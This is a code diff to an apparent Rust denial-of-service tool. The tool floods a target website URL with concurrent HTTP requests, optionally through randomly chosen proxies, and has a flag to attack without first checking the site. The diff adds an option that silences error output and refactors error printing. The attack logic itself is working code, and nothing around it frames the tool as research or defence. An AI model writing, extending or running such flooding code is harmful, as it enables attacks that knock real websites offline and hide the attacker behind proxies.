@@ -32,16 +32,19 @@ struct Args {
     /// Start DoS without website status checking
     #[clap(short, long, takes_value = false)]
     force: bool,
+
+    /// Do not display errors
+    #[clap(short, long, takes_value = false)]
+    error_mode: bool,
 }
 
 struct DenialOfService {
     url: String,
     spawned_requests: AtomicU128,
-    activate_proxy: bool,
 }
 
 impl DenialOfService {
-    async fn attack(self: &Arc<Self>) {
+    async fn attack(self: &Arc<Self>, activate_proxy: bool, error_mode: bool) {
         let mut proxies = Vec::new();
         if let Ok(lines) = read_lines("./proxies.txt") {
             for line in lines {
@@ -58,7 +61,7 @@ impl DenialOfService {
             }
 
             let self_cloned = self.clone();
-            if self_cloned.activate_proxy {
+            if activate_proxy {
                 let taken_proxy = take_random_proxy(proxies.clone());
                 spawned_tasks.push(tokio::spawn(async move {
                     match reqwest::Proxy::http(taken_proxy.clone()) {
@@ -80,24 +83,15 @@ impl DenialOfService {
                                     }
                                 }
                                 Err(e) => {
-                                    display_time();
-
-                                    let error_string = format!("{}", e);
-                                    println!("{}", error_string.red().bold());
+                                    display_error(format!("{}", e), error_mode);
                                 }
                             },
                             Err(e) => {
-                                display_time();
-
-                                let error_string = format!("{}", e);
-                                println!("{}", error_string.red().bold());
+                                display_error(format!("{}", e), error_mode);
                             }
                         },
                         Err(e) => {
-                            display_time();
-
-                            let error_string = format!("{}", e);
-                            println!("{}", error_string.red().bold());
+                            display_error(format!("{}", e), error_mode);
                         }
                     };
                 }));
@@ -118,10 +112,7 @@ impl DenialOfService {
                             }
                         }
                         Err(e) => {
-                            display_time();
-
-                            let error_string = format!("{}", e);
-                            println!("{}", error_string.red().bold());
+                            display_error(format!("{}", e), error_mode);
                         }
                     }
                 }));
@@ -140,6 +131,13 @@ fn display_time() {
     );
 
     print!("{} ", time.blue());
+}
+
+fn display_error(text: String, error_mode: bool) {
+    if !error_mode {
+        display_time();
+        println!("{}", text.red().bold());
+    }
 }
 
 fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
@@ -172,15 +170,14 @@ async fn website_is_up(url: String) -> Result<(), WebsiteError> {
     }
 }
 
-async fn start_denial_of_service(url: String, activate_proxy: bool) {
+async fn start_denial_of_service(url: String, activate_proxy: bool, error_mode: bool) {
     display_time();
     println!("{} {}", "DoS is running at".green(), url.clone().bold());
     Arc::new(DenialOfService {
         url: url.clone(),
         spawned_requests: AtomicU128::new(0),
-        activate_proxy,
     })
-    .attack()
+    .attack(activate_proxy, error_mode)
     .await
 }
 
@@ -190,31 +187,26 @@ async fn main() {
 
     let website_url = args.url;
     let activate_proxy = args.proxy;
+    let error_mode = args.error_mode;
 
     if args.force {
-        start_denial_of_service(website_url.clone(), activate_proxy).await;
+        start_denial_of_service(website_url.clone(), activate_proxy, error_mode).await;
     }
 
     match website_is_up(website_url.clone()).await {
         Ok(()) => {
-            start_denial_of_service(website_url.clone(), activate_proxy).await;
+            start_denial_of_service(website_url.clone(), activate_proxy, error_mode).await;
         }
         Err(WebsiteError::WebsiteUnaccessible) => {
-            display_time();
-            println!(
-                "{}",
-                "Unable to ping website. Make sure the link is spelled correctly!"
-                    .red()
-                    .bold()
+            display_error(
+                "Unable to ping website. Make sure the link is spelled correctly!".to_string(),
+                error_mode,
             );
         }
         Err(WebsiteError::BadResponse) => {
-            display_time();
-            println!(
-                "{}",
-                "GET request to the site ended with an failure response!"
-                    .red()
-                    .bold()
+            display_error(
+                "GET request to the site ended with an failure response!".to_string(),
+                error_mode,
             );
         }
     }
